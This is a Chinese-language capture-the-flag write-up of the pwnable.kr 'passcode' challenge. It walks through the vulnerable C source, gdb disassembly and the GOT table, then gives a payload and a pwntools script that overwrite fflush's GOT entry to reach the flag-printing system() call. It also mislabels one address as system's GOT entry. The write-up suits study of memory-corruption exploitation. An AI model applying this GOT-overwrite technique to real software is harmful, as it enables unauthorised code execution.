---
title: pwnable--passcode
updated: 2022-09-06 08:11:24Z
created: 2022-04-12 15:14:02Z
---

[参考](https://blog.csdn.net/qq_20307987/article/details/51303824)

**知识点：**

```
EIP、EBP、ESP的作用：
EIP存储着下一条指令的地址，每执行一条指令，该寄存器变化一次

EBP存储着当前函数栈底的地址，栈底通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址（很重要）

ESP就是前面说的，始终指向栈顶，只要ESP指向变了，那么当前栈顶就变了
```

* * *

```
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

**ssh passcode@pwnable.kr -p2222 (pw:guest)得到**

```sh
passcode@pwnable:~$ ls
flag  passcode	passcode.c
passcode@pwnable:~$ file passcode
passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped
passcode@pwnable:~$ checksec passcode
[*] '/home/passcode/passcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

**cat passcode.c**

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);     //由于少了取地址符号&，可以以passcode值寻址到的内存地址进行覆盖
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
        scanf("%d", passcode2);

    printf("checking...\n");
    if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
        exit(0);
        }
}

void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}

int main(){
    printf("Toddler's Secure Login System 1.0 beta.\n");

    welcome();
    login();

    // something after login...
    printf("Now I can safely trust you that you have credential :)\n");
    return 0;
}
```

**尝试运行passcode**

```sh
passcode@pwnable:~$ ./passcode 
Toddler's Secure Login System 1.0 beta.
enter you name : admin
Welcome admin!
enter passcode1 : dsj
enter passcode2 : checking...
Login Failed!
```

**PS:**

```
fflush(stdin)是一个计算机专业术语，功能是清空输入缓冲区
通常是为了确保不影响后面的数据读取(例如在读完一个字符串后紧接着又要读取一个字符，此时应该先执行fflush(stdin)
```

* * *

**objdump查看函数：**

```shell
passcode@pwnable:~$ objdump -t -j .text passcode

passcode:     file format elf32-i386

SYMBOL TABLE:
080484b0 l    d  .text	00000000              .text
080484e0 l     F .text	00000000              __do_global_dtors_aux
08048540 l     F .text	00000000              frame_dummy
08048720 l     F .text	00000000              __do_global_ctors_aux
08048710 g     F .text	00000002              __libc_csu_fini
08048712 g     F .text	00000000              .hidden __i686.get_pc_thunk.bx
08048564 g     F .text	000000a5              login
08048609 g     F .text	0000005c              welcome
080486a0 g     F .text	00000061              __libc_csu_init
080484b0 g     F .text	00000000              _start
08048665 g     F .text	00000032              main
```

**使用gdb进行调试：**

```sh
(gdb) disass main
Dump of assembler code for function main:
   0x08048665 <+0>:	push   %ebp
   0x08048666 <+1>:	mov    %esp,%ebp
   0x08048668 <+3>:	and    $0xfffffff0,%esp
   0x0804866b <+6>:	sub    $0x10,%esp
   0x0804866e <+9>:	movl   $0x80487f0,(%esp)
   0x08048675 <+16>:	call   0x8048450 <puts@plt>
   0x0804867a <+21>:	call   0x8048609 <welcome>
   0x0804867f <+26>:	call   0x8048564 <login>
   0x08048684 <+31>:	movl   $0x8048818,(%esp)
   0x0804868b <+38>:	call   0x8048450 <puts@plt>
   0x08048690 <+43>:	mov    $0x0,%eax
   0x08048695 <+48>:	leave  
   0x08048696 <+49>:	ret    
End of assembler dump.
```

```sh
(gdb) disass welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:	push   %ebp
   0x0804860a <+1>:	mov    %esp,%ebp
   0x0804860c <+3>:	sub    $0x88,%esp
   0x08048612 <+9>:	mov    %gs:0x14,%eax
   0x08048618 <+15>:	mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:	xor    %eax,%eax
   0x0804861d <+20>:	mov    $0x80487cb,%eax
   0x08048622 <+25>:	mov    %eax,(%esp)
   0x08048625 <+28>:	call   0x8048420 <printf@plt>
   0x0804862a <+33>:	mov    $0x80487dd,%eax
   0x0804862f <+38>:	lea    -0x70(%ebp),%edx    //name
   0x08048632 <+41>:	mov    %edx,0x4(%esp)
   0x08048636 <+45>:	mov    %eax,(%esp)
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:	mov    $0x80487e3,%eax
   0x08048643 <+58>:	lea    -0x70(%ebp),%edx
   0x08048646 <+61>:	mov    %edx,0x4(%esp)
   0x0804864a <+65>:	mov    %eax,(%esp)
   0x0804864d <+68>:	call   0x8048420 <printf@plt>
   0x08048652 <+73>:	mov    -0xc(%ebp),%eax
   0x08048655 <+76>:	xor    %gs:0x14,%eax
   0x0804865c <+83>:	je     0x8048663 <welcome+90>
   0x0804865e <+85>:	call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:	leave  
   0x08048664 <+91>:	ret    
End of assembler dump.
```

```sh
(gdb) disass login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx       //passcode1
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx      //passcode2
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
```

**GOT表**

```
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 9
 
[0x804a000] printf@GLIBC_2.0 -> 0x8048426 (printf@plt+6) ◂— push   0 /* 'h' */
[0x804a004] fflush@GLIBC_2.0 -> 0x8048436 (fflush@plt+6) ◂— push   8
[0x804a008] __stack_chk_fail@GLIBC_2.4 -> 0x8048446 (__stack_chk_fail@plt+6) ◂— push   0x10
[0x804a00c] puts@GLIBC_2.0 -> 0xf7e2b480 (puts) ◂— push   ebp
[0x804a010] system@GLIBC_2.0 -> 0x8048466 (system@plt+6) ◂— push   0x20 /* 'h ' */
[0x804a014] __gmon_start__ -> 0x8048476 (__gmon_start__@plt+6) ◂— push   0x28 /* 'h(' */
[0x804a018] exit@GLIBC_2.0 -> 0x8048486 (exit@plt+6) ◂— push   0x30 /* 'h0' */
[0x804a01c] __libc_start_main@GLIBC_2.0 -> 0xf7dda820 (__libc_start_main) ◂— call   0xf7f011a9
[0x804a020] __isoc99_scanf@GLIBC_2.7 -> 0x80484a6 (__isoc99_scanf@plt+6) ◂— push   0x40 /* 'h@' */
```

下断点分析welcome函数

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/0e7c8ab7b10fa001580f5933a6ae2ed8.png" alt="0e7c8ab7b10fa001580f5933a6ae2ed8.png" width="721" height="557" class="jop-noMdConv">

**welcome函数ebp为0xffffd498**

**且启动了gs栈检测，所以不能将返回地址直接覆盖为目标地址**

**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/6419dc61c9c0f05b2b34458d7015ddb1.png" alt="6419dc61c9c0f05b2b34458d7015ddb1.png" width="905" height="547" class="jop-noMdConv">**

可以看到，在`0x8048639 <welcome+48>: call 0x80484a0 <__isoc99_scanf@plt>` 是输入name的字符串提示，那么下一个地是就是name的地址

**name:edx,\[ebp-0x70\]**

继续往下走

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/dad60098217a99f1636bc8b51292ccde.png" alt="dad60098217a99f1636bc8b51292ccde.png" width="814" height="475" class="jop-noMdConv">

可以看到输入的name值aaaaaa的地址是0xffffd428

* * *

继续执行，跳转至login函数

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/99d4e02163a0c9845b4f1da867be32d3.png" alt="99d4e02163a0c9845b4f1da867be32d3.png" width="807" height="699" class="jop-noMdConv">

**可以发现login函数ebp也是0xffffd498，故welcome函数和login函数有相同的ebp**

** <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/edcbf79e8e6ec8df60c743cb5f79779c.png" alt="edcbf79e8e6ec8df60c743cb5f79779c.png" width="962" height="577" class="jop-noMdConv">**

**passcode1:edx,DWORD PTR \[ebp-0x10\]**

已知welcome和login函数拥有同一ebp,那么name和passcode1在同一个栈空间里，可以覆写GOT

name:edx,\[ebp-0x70\] - passcode1:edx,DWORD PTR \[ebp-0x10\]即 **ebp-0x70 - ebp-0x10=96，即name和passcode1相差96字节**

可以看到在login()中，执行scanf()后执行fflush()函数，可以通过name变量覆盖，将passcode1的值改为fflush()函数的地址

在接下来执行login()时，fflush()函数的地址的值，通过scanf()被赋值为system地址，实行执行查看flag的命令

****找到fflush()的got表项地址为0x804a004，system()的got表项地址为0x080485e3****

* * *

可以得到payload = ‘a’*96+’\\x04\\xA0\\x04\\x08’+’\\n’+‘134514147\\n’

* * *

python-c “‘a’*96+’\\x04\\xA0\\x04\\x08’+’\\n’+‘134514147\\n’”|./passcode

* * *

```python
# -*- coding:utf-8 -*-

from pwn import *

try:
    s = ssh(host='pwnable.kr',user='passcode',password='guest',port=2222)
    p = s.process('./passcode')
    p.sendline('a'*96+'\x04\xA0\x04\x08'+'\n'+'134514147\n')
    p.interactive()
except:
    print('error')
```

* * *

执行exp得到flag，如下图所示：

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/db8b2fc0245bad16909810e9269ea724.png" alt="db8b2fc0245bad16909810e9269ea724.png" width="933" height="556" class="jop-noMdConv">